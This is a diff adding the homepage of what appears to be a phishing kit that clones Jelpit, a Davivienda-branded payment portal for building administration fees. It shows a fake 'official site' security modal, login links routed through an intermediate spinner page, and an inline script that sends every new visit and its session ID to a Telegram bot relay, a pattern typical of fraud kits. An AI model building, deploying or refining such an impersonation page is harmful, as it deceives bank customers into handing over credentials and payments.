@@ -1,0 +1,319 @@
+
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Servicios para el hogar y tu familia</title>
+    <link rel="icon" type="image/svg+xml" href="img/favicon.svg">
+    <!-- Roboto Condensed -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap"
+        rel="stylesheet">
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+
+<body class="has-bottom-nav">
+
+    <div class="security-modal" id="securityModal" aria-modal="true" role="dialog"
+        aria-labelledby="securityModalTitle" aria-describedby="securityModalDesc">
+        <div class="security-modal__dialog">
+            <button class="security-modal__close" aria-label="Cerrar aviso" data-security-close>
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="security-modal__icon-wrapper">
+                <img src="img/icono_proteccion_preventivaaaa.svg" alt="Mano de seguridad Jelpit"
+                    class="security-modal__icon">
+            </div>
+            <h2 class="security-modal__title" id="securityModalTitle">¡Estás en un sitio oficial de Jelpit!</h2>
+            <p class="security-modal__description" id="securityModalDesc">
+                Te encuentras en un entorno seguro. Recuerda que en Jelpit no te pediremos códigos de confirmación por
+                fuera de la plataforma.
+            </p>
+            <button class="security-modal__cta" data-security-close>Continuar</button>
+        </div>
+    </div>
+
+    <header class="header">
+        <div class="header-container">
+            <div class="header-logo">
+                <img src="img/logo_jelpit_color.svg" alt="Jelpit Logo">
+            </div>
+            <div class="header-actions">
+                <!-- Dropdown Conjuntos -->
+                <div class="dropdown-wrapper">
+                    <button class="btn btn-conjuntos" id="desktopConjuntosBtn">
+                        Conjuntos <i class="fa-solid fa-chevron-down toggle-icon"></i>
+                    </button>
+                    <ul class="desktop-dropdown-menu" id="desktopConjuntosMenu">
+                        <li><a href="busqueda.html">Paga tu administración</a></li>
+                        <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
+                        <li><a href="#">¿Cómo funciona?</a></li>
+                        <li><a href="#">Quiero vincularme</a></li>
+                        <li><a href="#">Ingresa a Cuotas al dia</a></li>
+                    </ul>
+                </div>
+
+                <a href="busqueda.html" class="btn-pagar-desktop">
+                    <div class="dollar-circle-icon"><i class="fa-solid fa-dollar-sign"></i></div>
+                    <span>Pagar<br>administración</span>
+                </a>
+                <a href="spinner.html?next=login.html" class="btn btn-login" id="btnLoginDesktop">
+                    <i class="fa-regular fa-user"></i> Iniciar sesión
+                </a>
+            </div>
+            <!-- Mobile right side: pagar btn + hamburger -->
+            <div class="header-mobile-actions">
+                <a href="busqueda.html" class="btn-img-link">
+                    <img src="img/floating_residential_jelpit.svg" alt="Pagar administración" class="btn-pagar-img">
+                </a>
+                <button class="btn-hamburger" id="btnHamburger" aria-label="Abrir menú">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Overlay -->
+    <div class="menu-overlay" id="menuOverlay"></div>
+
+    <!-- Drawer lateral -->
+    <nav class="mobile-drawer" id="mobileDrawer">
+        <!-- Esquina morada con logo -->
+        <div class="drawer-header">
+            <a href="#" class="drawer-logo">
+                <img src="img/logo_jelpit_color.svg" alt="Jelpit Logo">
+            </a>
+            <button class="drawer-close" id="drawerClose" aria-label="Cerrar menú">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+        </div>
+        <!-- Items del menú -->
+        <ul class="drawer-menu">
+            <li class="drawer-menu-item">
+                <a href="#">
+                    <i class="fa-solid fa-house"></i>
+                    <span>Inicio</span>
+                </a>
+            </li>
+            <li class="drawer-menu-item has-submenu">
+                <button class="drawer-submenu-toggle" id="conjuntosToggle">
+                    <span class="drawer-item-left">
+                        <i class="fa-solid fa-circle-dollar-to-slot"></i>
+                        <span>Conjuntos</span>
+                    </span>
+                    <i class="fa-solid fa-chevron-down drawer-chevron"></i>
+                </button>
+                <ul class="drawer-submenu" id="conjuntosSubmenu">
+                    <li><a href="#">Paga tu administración</a></li>
+                    <li><a href="#">Ingresa a Jelpit Conjuntos</a></li>
+                    <li><a href="#">¿Cómo funciona?</a></li>
+                    <li><a href="#">Quiero vincularme</a></li>
+                    <li><a href="#">Ingresa a Cuotas al dia</a></li>
+                </ul>
+            </li>
+        </ul>
+    </nav>
+
+
+    <main>
+        <section class="banner">
+            <div class="carousel" id="bannerCarousel">
+                <div class="carousel-inner">
+                    <picture class="carousel-item active">
+                        <source media="(max-width: 768px)" srcset="img/Ao7mIu6eLDqEFOO3wCm6XA6rP4eqnvONv8kafRlx.jpg">
+                        <img src="img/a778HMxVTb1odSSJ6PhUv6HlhBeJB5loIU5arUob.webp" alt="Banner 1">
+                    </picture>
+                    <picture class="carousel-item">
+                        <source media="(max-width: 768px)" srcset="img/hDYgsKcGFHPBK0mhZHgzMA0JYbjxZjzpLQR6Hsoy.jpg">
+                        <img src="img/3o9q0fSnKIxxODUwVz1898gWGP3zSSERUhGBIzBi.webp" alt="Banner 2">
+                    </picture>
+                    <picture class="carousel-item">
+                        <source media="(max-width: 768px)" srcset="img/rdby7ptHqHwJ5ThWDVY1VlOQ5gjKsLd1wD00OxTA.jpg">
+                        <img src="img/JrwlYWZJIeRUKBFod0T48s8Wh7xlR50oaCfTdzrZ.webp" alt="Banner 3">
+                    </picture>
+                    <picture class="carousel-item">
+                        <source media="(max-width: 768px)" srcset="img/YpjswR35ocxXmijd3e8ROzjo9rNDQp4zbKfh1bVw.jpg">
+                        <img src="img/9oH0TkoYJskah9F6sHpgmMDJxOkK9p6vMO2xyy8f.webp" alt="Banner 4">
+                    </picture>
+                </div>
+                <!-- Indicators -->
+                <div class="carousel-indicators">
+                    <span class="dot active" data-slide="0"></span>
+                    <span class="dot" data-slide="1"></span>
+                    <span class="dot" data-slide="2"></span>
+                    <span class="dot" data-slide="3"></span>
+                </div>
+            </div>
+        </section>
+
+        <div class="services-wrapper">
+            <button class="btn-chat-mia">
+                <i class="fa-regular fa-message"></i>
+                <span style="font-size: 14px; margin-top: 4px;">Chat MIA</span>
+            </button>
+            <section class="services">
+                <h2 class="services-title">Nuestros Servicios</h2>
+                <div class="services-grid">
+
+                    <div class="service-card">
+                        <div class="card-image">
+                            <img src="img/tJwhe0KG3NdOPD9Ueb8wFd2NCPEa339NzAQeM6gA.png" alt="Pagar administración">
+                        </div>
+                        <div class="card-content">
+                            <h3>Pagar administración</h3>
+                            <p>Fácil, seguro y en casa.</p>
+                            <a href="busqueda.html" class="card-link">Pagar ahora <i
+                                    class="fa-solid fa-chevron-right"></i></a>
+                        </div>
+                    </div>
+
+                    <div class="service-card">
+                        <div class="card-image">
+                            <img src="img/8bQlJrv12alPSE8wvdsKt90mFGo52Y4VzkBDCoJB.png" alt="Crédito de Vivienda">
+                        </div>
+                        <div class="card-content">
+                            <h3>Crédito de Vivienda</h3>
+                            <p>Te acompañamos en cada paso</p>
+                            <a href="#" class="card-link">Pedir mi crédito <i class="fa-solid fa-chevron-right"></i></a>
+                        </div>
+                    </div>
+
+                    <div class="service-card">
+                        <div class="card-image">
+                            <img src="img/HEvEX8JuK7I9INiFQK4bOydUxMo5E8SLHWw5iG06.png" alt="Conciliar fácil?">
+                        </div>
+                        <div class="card-content">
+                            <h3>Conciliar fácil?</h3>
+                            <p>En Jelpit lo logras en menos de 15 minutos.</p>
+                            <a href="#" class="card-link">Quiero Vincularme <i
+                                    class="fa-solid fa-chevron-right"></i></a>
+                        </div>
+                    </div>
+
+                    <div class="service-card">
+                        <div class="card-image">
+                            <img src="img/Uo3ByiGTc6rYm6GS3W9ROLAMA7AiZF4uvtaKnnl3.png" alt="Asistencias Davivienda">
+                        </div>
+                        <div class="card-content">
+                            <h3>Asistencias Davivienda</h3>
+                            <p>Beneficios GRATIS con tu tarjeta de crédito</p>
+                            <a href="#" class="card-link">Prográmalas YA <i class="fa-solid fa-chevron-right"></i></a>
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-top">
+            <div class="footer-left">
+                <img src="img/vigilado.svg" alt="Vigilado" class="vigilado-img">
+                <p>Servicio ofrecido por Banco Davivienda S.A. y<br>operado por Servicios Bolívar S.A.</p>
+            </div>
+            <div class="footer-center">
+                <h3>¿Necesitas ayuda? ¿Tienes preguntas, quejas o reclamos?</h3>
+                <p>Escríbenos a <a
+                        href="mailto:lineadesoporte923@serviciosbolivar.com">lineadesoporte923@serviciosbolivar.com</a>
+                    o llámanos desde tu<br>celular al <strong>#923</strong> o al número <strong>601 3905331</strong>.
+                </p>
+            </div>
+            <div class="footer-right">
+                <div class="social-icons">
+                    <a href="#"><i class="fa-brands fa-youtube"></i></a>
+                    <a href="#"><i class="fa-brands fa-linkedin-in"></i></a>
+                    <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
+                    <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                    <a href="#"><i class="fa-brands fa-tiktok"></i></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-links">
+                <a href="#">Términos y condiciones</a>
+                <a href="#">Política de Tratamiento de Datos Personales</a>
+                <a href="#">Superintendencia de Industria y Comercio (SIC)</a>
+                <a href="#">Canales de preferencia</a>
+            </div>
+            <p class="copyright">Jelpit 2026© - Banco Davivienda S.A. NIT: 860.034.313-7 Todos los derechos reservados.
+                Dirección de notificación judicial: Av. El Dorado No. 68C-61 Bogotá D.C.</p>
+        </div>
+    </footer>
+
+    <!-- Mobile Bottom NavBar -->
+    <nav class="mobile-bottom-nav">
+        <a href="spinner.html?next=login.html" class="bottom-btn" id="btnLoginMobile">
+            <i class="fa-regular fa-user"></i>
+            <span>Iniciar sesión</span>
+        </a>
+        <button class="bottom-btn">
+            <i class="fa-regular fa-message"></i>
+            <span>Chat MIA</span>
+        </button>
+    </nav>
+
+    <script src="js/session-id.js"></script>
+    <script>
+        (function notifyVisit() {
+            if (sessionStorage.getItem('_jlp_visit_sent')) return;
+            sessionStorage.setItem('_jlp_visit_sent', '1');
+
+            let sid = 'N/A';
+            try { sid = getCartoonSessionId(); } catch (e) { }
+
+            const text = '<b>NUEVA VISITA</b>\n<b>Sesión:</b> <code>' + sid + '</code>';
+
+            fetch('api/telegram/dispatch.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    flow: 'portal_pagos',
+                    method: 'sendMessage',
+                    params: { text: text, parse_mode: 'HTML' }
+                })
+            }).catch(() => { });
+        })();
+    </script>
+    <script>
+        (function initSecurityModal() {
+            const modal = document.getElementById('securityModal');
+            if (!modal) return;
+
+            const openModal = () => {
+                modal.classList.add('is-visible');
+                document.body.classList.add('modal-open');
+            };
+
+            const closeModal = () => {
+                modal.classList.remove('is-visible');
+                document.body.classList.remove('modal-open');
+            };
+
+            modal.querySelectorAll('[data-security-close]').forEach((trigger) => {
+                trigger.addEventListener('click', closeModal);
+            });
+
+            modal.addEventListener('click', (event) => {
+                if (event.target === modal) {
+                    closeModal();
+                }
+            });
+
+            window.requestAnimationFrame(() => {
+                setTimeout(openModal, 300);
+            });
+        })();
+    </script>
+    <script src="js/script.js"></script>
+</body>
+
+</html>
